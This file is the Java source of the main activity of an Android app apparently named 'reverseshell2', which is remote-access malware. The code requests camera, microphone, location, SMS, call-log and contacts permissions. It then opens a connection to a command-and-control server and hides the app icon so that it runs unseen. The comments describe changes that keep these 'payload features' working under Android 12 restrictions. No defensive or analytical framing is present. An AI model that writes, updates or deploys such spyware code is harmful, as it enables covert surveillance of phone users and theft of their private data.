package com.example.reverseshell2;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

/**
 * MainActivity, updated for Android 12.
 *
 * Changes made for Android 12:
 *  1. RUNTIME PERMISSIONS - Android 6+ requires dangerous permissions to be
 *     granted at runtime. The original code called finish() immediately, which
 *     on Android 12 means permission dialogs would NEVER appear (the activity
 *     is gone before the request is made) and all the payload features (camera,
 *     mic, location, SMS, call logs) would be blocked. This version requests all
 *     required permissions BEFORE finishing.
 *
 *  2. FOREGROUND SERVICE START RESTRICTION (Android 12) - Starting a foreground
 *     service from the background is blocked. The original code called finish()
 *     BEFORE starting the C2 connection. Now the connection is started BEFORE
 *     finish(), while the activity is still in the foreground, so the service
 *     start is allowed.
 *
 *  3. ICON HIDING ORDER - The original hid the app icon immediately. If the icon
 *     is hidden before the user grants permissions, the user can never reopen
 *     the app to grant them. Now the icon is hidden only AFTER the permission
 *     flow completes (if requested).
 *
 *  4. POST_NOTIFICATIONS (Android 13+) - Requested so the foreground-service
 *     notification is visible on API 33+.
 *
 *  5. WAKE LOCK - SCREEN_DIM_WAKE_LOCK is deprecated. On Android 12, wake locks
 *     must be acquired while the app is in the foreground and the level must be
 *     supported (PowerManager.isWakeLockLevelSupported). Left commented out as
 *     in the original, but corrected so it can be safely enabled.
 */
public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;

    private static final int REQ_PERMISSIONS = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context = getApplicationContext();
        Log.d(TAG, config.IP + "\t" + config.port);

        // ------------------------------------------------------------------
        // Android 6+: request all dangerous permissions before doing anything.
        // On Android 12 this MUST happen while the activity is visible.
        // ------------------------------------------------------------------
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] needed = getRequiredPermissions();
            List<String> missing = new ArrayList<>();
            for (String permission : needed) {
                if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                    missing.add(permission);
                }
            }
            if (!missing.isEmpty()) {
                requestPermissions(missing.toArray(new String[0]), REQ_PERMISSIONS);
                return; // proceed() runs from onRequestPermissionsResult
            }
        }

        proceed();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSIONS) {
            // Even if the user denied some, start with whatever was granted.
            // (Denied dangerous permissions simply mean those payload commands
            //  will report "Permission Not Granted" - they will not crash.)
            proceed();
        }
    }

    /**
     * Runs once permissions are resolved: starts the C2 connection while the
     * activity is still in the foreground (Android 12 requirement), then
     * finishes and optionally hides the icon.
     */
    private void proceed() {

        // Android 12: start the connection BEFORE finish() so the app is still
        // in the foreground when the service/thread is created. This avoids the
        // "Background service start not allowed" IllegalStateException.
        try {
            new tcpConnection(activity, context).execute(config.IP, config.port);
        } catch (Exception e) {
            Log.e(TAG, "Failed to start tcpConnection", e);
        }

        // Wake lock - deprecated level; only used if enabled and supported.
        // final PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        // if (pm != null && pm.isWakeLockLevelSupported(PowerManager.PARTIAL_WAKE_LOCK)) {
        //     mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG + ":wake");
        //     mWakeLock.acquire();
        // }

        // Hide the icon ONLY after permissions are resolved, so the user cannot
        // lose access to the app before granting permissions.
        if (config.icon) {
            try {
                new functions(activity).hideAppIcon(context);
            } catch (Exception e) {
                Log.e(TAG, "hideAppIcon failed", e);
            }
        }

        finish();
        overridePendingTransition(0, 0);
    }

    /**
     * Returns all dangerous permissions the payloads need. Only the ones for
     * the current Android version are included (e.g. POST_NOTIFICATIONS only
     * exists on API 33+).
     */
    private String[] getRequiredPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.READ_PHONE_STATE);
        perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE); // ignored on API 29+, no-op request
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        return perms.toArray(new String[0]);
    }
}

